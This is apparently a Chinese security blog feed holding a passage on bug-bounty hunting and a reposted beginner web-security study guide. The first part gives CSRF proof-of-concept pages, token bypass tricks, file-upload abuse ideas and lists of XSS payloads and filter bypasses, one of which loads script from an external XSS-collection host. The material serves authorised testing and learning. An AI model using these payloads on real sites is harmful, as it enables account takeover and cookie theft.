    <a href="#%e5%85%b6%e4%bb%96%e7%9a%84owasptop10%e6%bc%8f%e6%b4%9e" class="header-mark"></a>其他的OWASPTop10漏洞</h3><h4 id="csrf漏洞" class="headerLink">
    <a href="#csrf%e6%bc%8f%e6%b4%9e" class="header-mark"></a>CSRF漏洞</h4><p>CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。</p>
<p><strong>常见的漏洞点</strong></p>
<p>1、修改个人资料、邮箱、密码、头像</p>
<p>2、发表文章</p>
<p>3、添加、删除评论</p>
<p>4、添加、修改、删除收货地址</p>
<p>5、添加管理员</p>
<p><strong>(1) GET型</strong></p>
<p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p>
<ul>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;img src=http://www.xxxxx.com/csrf?xx=11 /&gt;
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p>(<strong>2) POST型</strong></p>
<p>POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。</p>
<p>poc(可以用burp自己生成的）:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;    
</span></span><span class="line"><span class="cl">&lt;body&gt;         
</span></span><span class="line"><span class="cl">&lt;form name=&#34;px&#34; method=&#34;post&#34; action=&#34;http://www.xxxxx.com/add&#34;&gt;            
</span></span><span class="line"><span class="cl">&lt;input type=&#34;text&#34; name=&#34;user_id&#34; value=&#34;1111&#34;&gt;        
</span></span><span class="line"><span class="cl">&lt;/form&gt;       
</span></span><span class="line"><span class="cl">&lt;script&gt;document.px.submit(); &lt;/script&gt;     
</span></span><span class="line"><span class="cl">&lt;/body&gt; 
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>POST请求数据为json，当服务器没有严格校验content-type类型时，POC为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">xhr</span> <span class="o">=</span> <span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl"><span class="n">xhr</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="s2">&#34;http://www.xxxx.com/api/setrole&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="n">xhr</span><span class="o">.</span><span class="n">withCredentials</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl"><span class="n">xhr</span><span class="o">.</span><span class="n">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;text/plain;charset=UTF-8&#34;</span><span class="p">);</span>  <span class="n">xhr</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;{&#34;role&#34;:admin}&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="3-flash-型" class="headerLink">
    <a href="#3-flash-%e5%9e%8b" class="header-mark"></a>3. Flash 型</h5><p>Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。</p>
<p>利用条件：</p>
<p>1、目标站点下必须存在crossdomain.xml文件。</p>
<p>2、crossdomain.xml中的配置允许其他域进行跨域请求。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;&lt;cross-domain-policy&gt;  &lt;allow-access-from domain=&#34;*&#34; /&gt;&lt;/cross-domain-policy&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>bypass小技巧</strong></p>
<ul>
<li>删除csrf token</li>
<li>置空csrf token</li>
<li>修改请求方法，如POST方法变GET请求</li>
<li>使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么</li>
<li>使用固定token</li>
<li>token字段改成 token[]=</li>
</ul>
<h4 id="任意文件上传漏洞" class="headerLink">
    <a href="#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e" class="header-mark"></a>任意文件上传漏洞</h4><p>这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。</p>
<ul>
<li>上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。</li>
<li>上传恶意文件进行钓鱼</li>
<li>尝试在上传的文件名前加../进行目录穿越。</li>
<li>可以结合其他漏洞比如CORS漏洞扩大危害。</li>
</ul>
<p>文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。</p>
<h4 id="xss漏洞" class="headerLink">
    <a href="#xss%e6%bc%8f%e6%b4%9e" class="header-mark"></a>XSS漏洞</h4><p>老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章:<br>
<a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html" target="_blank" rel="noopener noreferrer">https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html</a></p>
<p>Broken5师傅的xsspayload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">xsspt</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">VBAhTu</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="n">javascript</span><span class="p">:</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="n">xss</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="mi">1</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">baidu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">img</span><span class="o">/</span><span class="n">bd_logo1</span><span class="o">.</span><span class="n">png</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">details</span> <span class="n">open</span> <span class="n">ontoggle</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">M</span> <span class="n">onmouseover</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="n">M</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">iframe</span> <span class="n">src</span><span class="o">=</span><span class="n">javascript</span><span class="p">:</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;&lt;/</span><span class="n">iframe</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">iframe</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="n">onfocus</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="n">onclick</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">form</span><span class="o">&gt;&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="n">formaction</span><span class="o">=</span><span class="n">javascript</span><span class="p">:</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="bypass姿势" class="headerLink">
    <a href="#bypass%e5%a7%bf%e5%8a%bf" class="header-mark"></a>bypass姿势</h5><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="c1">-- 空格被过滤 --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">img</span><span class="o">/</span><span class="n">src</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="o">/</span><span class="n">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- 双写绕过 --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">iimgmg</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">oonerrornerror</span><span class="o">=</span><span class="nf">aimglert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- 大小写绕过  --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">iMg</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">oNerRor</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- 利用eval() --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="s2">&#34;a=`aler`;b=`t(1)`;eval(a+b);&#34;</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="nf">eval</span><span class="p">(</span><span class="nf">atob</span><span class="p">(</span><span class="s1">&#39;YWxlcnQoMSk=&#39;</span><span class="p">))</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- 利用location --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="n">location</span><span class="o">=</span><span class="s1">&#39;javascript:%61%6C%65%72%74%28%31%29&#39;</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="n">location</span><span class="o">=</span><span class="s1">&#39;javascript:\x61\x6C\x65\x72\x74\x28\x31\x29&#39;</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="n">location</span><span class="o">=</span><span class="s2">&#34;javascr&#34;</span><span class="o">+</span><span class="s2">&#34;ipt:&#34;</span><span class="o">+</span><span class="s2">&#34;%61%6C%65%72%74%28%31%29&#34;</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- 括号被过滤 --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="s2">&#34;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&#34;</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- onerror=被过滤 --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="w">     </span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- 属性被转换为大写 --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="c1">-- 编码后被检测 --&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="威胁情报的提交" class="headerLink">
    <a href="#%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5%e7%9a%84%e6%8f%90%e4%ba%a4" class="header-mark"></a>威胁情报的提交</h4><p>这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的</p>
<p><a href="https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q</a></p>
<p><a href="https://bbs.ichunqiu.com/article-921-1.html" target="_blank" rel="noopener noreferrer">https://bbs.ichunqiu.com/article-921-1.html</a></p>
<p>可以试一试加一加各种羊毛群，反手撸一手羊毛群的羊毛。</p>
<h3 id="对于挖掘高危严重级别漏洞的一些思考" class="headerLink">
    <a href="#%e5%af%b9%e4%ba%8e%e6%8c%96%e6%8e%98%e9%ab%98%e5%8d%b1%e4%b8%a5%e9%87%8d%e7%ba%a7%e5%88%ab%e6%bc%8f%e6%b4%9e%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%9d%e8%80%83" class="header-mark"></a>对于挖掘高危、严重级别漏洞的一些思考</h3><p>因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。</p>
<h5 id="1自动化信息收集的能力" class="headerLink">
    <a href="#1%e8%87%aa%e5%8a%a8%e5%8c%96%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e7%9a%84%e8%83%bd%e5%8a%9b" class="header-mark"></a>1.自动化信息收集的能力</h5><p>这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。</p>
<p>这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。</p>
<h5 id="2打漏洞组合拳的能力" class="headerLink">
    <a href="#2%e6%89%93%e6%bc%8f%e6%b4%9e%e7%bb%84%e5%90%88%e6%8b%b3%e7%9a%84%e8%83%bd%e5%8a%9b" class="header-mark"></a>2.打漏洞组合拳的能力</h5><p>SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。</p>
<h5 id="3绕waf的能力" class="headerLink">
    <a href="#3%e7%bb%95waf%e7%9a%84%e8%83%bd%e5%8a%9b" class="header-mark"></a>3.绕waf的能力</h5><p>这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。</p>
<h5 id="4细心和耐心和一些运气" class="headerLink">
    <a href="#4%e7%bb%86%e5%bf%83%e5%92%8c%e8%80%90%e5%bf%83%e5%92%8c%e4%b8%80%e4%ba%9b%e8%bf%90%e6%b0%94" class="header-mark"></a>4.细心和耐心和一些运气</h5><p>心细挖天下，再加上一些运气，可能高危严重就到手了。</p>
<h4 id="总结" class="headerLink">
    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结</h4><p>挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。</p>]]></description>
</item><item>
    <title>给表弟的Web安全入门建议</title>
    <link>https://www.bysec.cn/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/</link>
    <pubDate>Wed, 13 Jan 2021 09:32:44 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://sosly.me/index.php/2017/07/17/studywebsec/" target="_blank" rel="noopener noreferrer">https://sosly.me/index.php/2017/07/17/studywebsec/</a></em></p>
</blockquote>
<p>表弟大一刚结束，学的是计算机相关的专业，上学期开始学安全相关的技术，我就给他买了一套云课堂的 <a href="https://mooc.study.163.com/smartSpec/detail/1001227001.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreferrer">《Web安全工程师微专业》</a> 课程，结果这货学到第一课的时候，因为错过章节考试时间直接没及格&hellip;&hellip;好在后边几课都按部就班的学习了，然后应该是6月份开始试着在 <a href="https://src.edu-info.edu.cn/" target="_blank" rel="noopener noreferrer">教育行业SRC</a> 挖掘漏洞，到现在也只是发现了几个XSS、敏感文件泄露之类的小漏洞，和他同期学习课程的一些同学已经挖了很多了排名很靠前，还有在企业SRC挖洞的，看看别人家的表弟&hellip;之前表弟要准备课程的期末考试之类的，现在放暑假了，我就建议说可以再好好学习那套课程，趁着暑假，多实践。然后就讨论到 <strong>有没有适合入门阶段学习的Web安全书籍</strong> 这个问题。</p>
<p>说到Web安全书籍，这几年其实是一种百家齐放的状态，不断有优秀的书籍出版，那这里就<strong>尽可能少地整理几本我阅读过的Web安全入门书籍</strong>作为推荐。</p>
<p>如果没学过相关课程的小伙伴，真的从0基础开始的话，还是需要先掌握一些基本的技能：</p>
<ol>
<li>学习 <a href="http://www.w3school.com.cn/web/index.asp" target="_blank" rel="noopener noreferrer">网站构建初级教程_W3C</a> 以及 <a href="http://www.runoob.com/http/http-tutorial.html" target="_blank" rel="noopener noreferrer">HTTP协议基础-runoob</a> 上了解Web前后端以及HTTP协议的一些基础介绍，花半天时间对相关技术有个概念性的了解就够了。</li>
<li>Windows下下载 <a href="http://www.phpstudy.net/" target="_blank" rel="noopener noreferrer">phpStudy</a> 或者 <a href="http://www.wampserver.com/" target="_blank" rel="noopener noreferrer">WAMP</a> ，在本地搭建Web服务器环境，然后自己搜索两篇文章学习下基本的操作方法。这个本地Web服务器也就相当于学习过程中的一个实验环境了。</li>
<li>学习浏览器的开发者工具（通常快捷键F12调出），搜索一些教学文章，掌握Chrome或者Firefox浏览器开发者工具中的Network、Elements功能的常见用法，可以<strong>查看HTTP数据包以及定位页面元素</strong>。</li>
</ol>
<h1 id="0x01-给表弟的web安全入门建议" class="headerLink">
    <a href="#0x01-%e7%bb%99%e8%a1%a8%e5%bc%9f%e7%9a%84web%e5%ae%89%e5%85%a8%e5%85%a5%e9%97%a8%e5%bb%ba%e8%ae%ae" class="header-mark"></a>0x01 给表弟的Web安全入门建议</h1><h2 id="适合初学者的web安全书籍" class="headerLink">
    <a href="#%e9%80%82%e5%90%88%e5%88%9d%e5%ad%a6%e8%80%85%e7%9a%84web%e5%ae%89%e5%85%a8%e4%b9%a6%e7%b1%8d" class="header-mark"></a>适合初学者的Web安全书籍</h2><ol>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgJcGVMSBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIXDlcTXBIdS0IJRmtqW1VPUUQGHGJsZR5uJhV%2Bc1U0R1pTDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEl8WChMEXStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVBxsFXRxcCltXWwg%3D" target="_blank" rel="noopener noreferrer">《白帽子讲Web安全》</a>
道哥出品，很多人的Web安全启蒙书。</li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgdcG1IXASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQISDlUSWRYdS0IJRmt3BGRXFloyC2dLcVRsPBN4W1sHX1JlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMWABsFUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAhsHXBlYCltXWwg%3D" target="_blank" rel="noopener noreferrer">《Web前端黑客技术揭秘》</a>
前端黑客技术，余弦的作品。</li>
</ol>
<p>对于读书，我觉得<strong>读书的目的是：学以致用</strong>。应该把<strong>注意力放在如何应用读到的知识，提高自己的技术，而不是学了多少内容。
一年哪怕只学习了一本书，也要让这本书的内容结结实实地提升自己的技能，而不是只为了多一点谈资或者阅读清单上多一个数目</strong>。这也是我这里只推荐了两本书的原因，因为我觉得这两本书，能够认真学习完，并且<strong>实践</strong>书中的案例和技能，已经很难得了，同时相比于简单翻一遍，要多花费很多的时间和精力。</p>
<h2 id="工具与实战" class="headerLink">
    <a href="#%e5%b7%a5%e5%85%b7%e4%b8%8e%e5%ae%9e%e6%88%98" class="header-mark"></a>工具与实战</h2><p>那学习Web安全呢，同时还要掌握一些工具：<strong>浏览器开发者工具与浏览器插件（如HackBar、ProxySwitcher）、抓包工具如Burpsuite、漏洞扫描和验证工具如御剑、sqlmap、AWVS</strong>，工具可以在 <a href="http://www.freebuf.com/" target="_blank" rel="noopener noreferrer">Freebuf</a>上自行搜索下载，教程可以参考<a href="https://www.ichunqiu.com/newRelease/darrPath/105" target="_blank" rel="noopener noreferrer">Web安全-i春秋</a>系列教程中对应这几款工具的章节学习。</p>
<p>好的工具可以帮助我们提高测试效率，扩展测试思路。除了工具的使用，通过搭建本地实战环境练习手工技巧，也是很好的进阶之路，这里建议可以搭建 <a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener noreferrer">DVWA</a>漏洞测试环境，然后参考 <a href="http://www.freebuf.com/?s=DVWA" target="_blank" rel="noopener noreferrer">DVWA系列教程_Freebuf</a>进行学习。</p>
<p>学习的同时也可以在在<a href="https://src.edu-info.edu.cn/" target="_blank" rel="noopener noreferrer">教育行业SRC</a>等漏洞平台上挖掘漏洞，赢得认可，也是一种动力，但挖掘漏洞的时候一定要注意规范和界限，可以参考<a href="https://sosly.me/index.php/2017/06/02/wangluoanquanfa/" target="_blank" rel="noopener noreferrer">自律方能自由，《网络安全法》实施后的白帽子行为参考</a>，挖掘漏洞的同时也要注意保护自己。</p>
<h2 id="适合初学者的社区和资讯站点" class="headerLink">
